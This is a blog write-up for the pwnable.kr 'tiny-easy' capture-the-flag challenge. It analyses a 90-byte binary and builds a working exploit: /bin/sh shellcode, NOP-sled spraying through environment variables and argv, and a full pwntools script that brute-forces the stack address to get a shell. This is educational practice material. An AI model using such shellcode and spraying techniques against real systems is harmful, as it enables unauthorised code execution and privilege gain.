---
layout: post
title:  Pwnable.kr - tiny-easy
categories: [pwnable.kr]
excerpt: Writeup for tiny-easy.
---
# Pwnable.kr - Tiny-Easy

The challenge can be found [here](http://pwnable.kr/play.php).

Without at least an attempt at the challenge, this writeup will probably not make much sense.
This is done to keep at least somewhat in the spirit of pwnable.kr style writeups.

# Initial insights

Immediately, an `ls -l` reveals the following about our binary:
```
-r-xr-sr-x 1 alexsieusahai alexsieusahai  90 Mar 24 19:44  tiny_easy
```
90 bytes?

What about `checksec`?
```
[*] '/home/alexsieusahai/pwnablekr/tiny_easy/tiny_easy'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```
Okay, NX bit off, no PIE and no ASLR, running on a 32 bit arch.

Okay, so with that in mind, if we try to run it, what happens?
```
alexsieusahai@mypc:~/pwnablekr/tiny_easy$ ./tiny_easy 
Segmentation fault (core dumped)
```
It just segfaults, perhaps unsurprisingly; 90 bytes is pretty much no instructions when you consider the fact that you still have to cram in other bytes to make your binary ELF compliant.

Popping the binary into Ghidra, we can see that basically nothing happens, and
we can also see why we segfault:
```
                             undefined entry()
             undefined         AL:1           <RETURN>
                             entry                                           XREF[2]:     Entry Point(*), 08048018(*)  
        08048054 58              POP        EAX
        08048055 5a              POP        EDX
        08048056 8b 12           MOV        EDX,dword ptr [EDX]
        08048058 ff d2           CALL       EDX

```
Okay, so we need to in some way control the values on the stack, in order to have that `CALL` instruction lead somewhere that we care about and eventually pop a shell.

# Defining the attack surface
Initially, what does our stack look like?
We care about this especially, as the second value will determine what we end up calling.
```
00:0000│ esp 0xffc4ef70 ◂— 0x1
01:0004│     0xffc4ef74 —▸ 0xffc4f154 ◂— '/home/alexsieusahai/pwnablekr/tiny_easy/tiny_easy'
02:0008│     0xffc4ef78 ◂— 0x0
03:000c|     env_vars...
```
Importantly, the top of the stack is argc, and the second part of the stack (these two values) are argv.

Perhaps surprisingly, the convention that `argv[0]` is the path to the executable is just a convention, and is not enforced anywhere in `execve`, which is how our binary is launched by the OS:

```
alexsieusahai@mypc:~/pwnablekr/tiny_easy$ strace ./tiny_easy
execve("./tiny_easy", ["./tiny_easy"], 0x7ffe85bed0c0 /* 55 vars */) = 0
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x69742f2e} ---
+++ killed by SIGSEGV (core dumped) +++
Segmentation fault (core dumped)
```

Since this can be arbitrary, and we have the no-execute bit off on our stack, we can simply include shellcode onto the stack, and then store the address to our shellcode in the environment variable!

Now, moving further on our machine is fairly trivial; we know that we want to pop a shell with group privileges, which will look like
```
setregid(tiny_easy_pwn_gid);
execve('/bin/sh', NULL, NULL);
```
But, we don't know the precise location of the stack on the target machine, to the best of my knowledge.
But, thankfully, this is very similar to a closely related idea of a JIT spray.
Spraying our shellcode everywhere we can in hopes that we land there is indeed reasonable, and will be our plan of attack.

# Crafting the exploit
Our shellcode is nothing surprising:
```
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
xor edx, edx
xor eax, eax
xor al, 11
int 0x80
```
One thing to note is that we can't have any nulls in our shellcode, but other than that it's fairly cut and dry.

Since we can't inspect our pwnable.kr machine using gdb for this challenge, we simply just have to guess our stack location and hope that we land on our shellcode.
A common pattern that follows after this idea is making this "good" area in which we jump as big as possible (similarly to, say, making the window in a race condition bigger, which is perhaps the most obvious line of thinking for this idea).
That is, we will make our jump as big as possible using NOP sleds, and we'll carefully make decisions on maximizing the number of "favorable" jumps to achieve success (by far compared to other writeups available on this problem) very frequently.

[It appears like the max length of an environment variable is 128 kilobytes](https://github.com/torvalds/linux/blob/master/include/uapi/linux/binfmts.h), so we'll try to make as much use of this as possible.
In particular, we know that we're passing in `argv` as just `[stack_address]`, so we burn only 4 bytes of our `PAGE_SIZE * 32` bytes available (note `PAGE_SIZE` is 4096; see introductions to virtual memory to demystify this number).
Moreover, in our `env`, we burn 2 bytes on `some_byte=`, such as (in our case) `0=`.
So, this leaves us with the following NOP sled:
```python
shellcode = b'\x90' * (4096 * 32 - 6 - len(shellcode)) + shellcode
```

Now, this is just the max for one given environment variable.
The next thing we should care about is how long our `execve()` syscall is allowed to be at all!
Apparently (and in retrospect not surprisingly), the [answer is not portable](https://www.in-ulm.de/~mascheck/various/argmax/), and thus I just do a little trial and error.

I ended up putting as many vars into my environment until something complained, and similar for spraying into `argv`.

# The final exploit

No implementation details or gotchas below, but for completion, this is the full exploit.

```python
import os
from pwn import *

STACK_LOC = b'\xff\xff\xee\xff'
shellcode = asm('''
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
xor edx, edx
xor eax, eax
xor al, 11
int 0x80
xor eax, eax
inc eax
int 0x80
''')

shellcode = b'\x90' * (4096 * 32 - 6 - len(shellcode) + 3) + shellcode

env = {str(i) : shellcode for i in range(10)}
argv = [STACK_LOC] + [shellcode] * 5
for _ in range(0x100):
    p = process(argv=argv, executable='./tiny_easy', env=env)
    try:
        p.sendline('whoami')
        p.recv(100)
    except Exception as e:
        print('failure...')
        continue

    p.interactive()
```
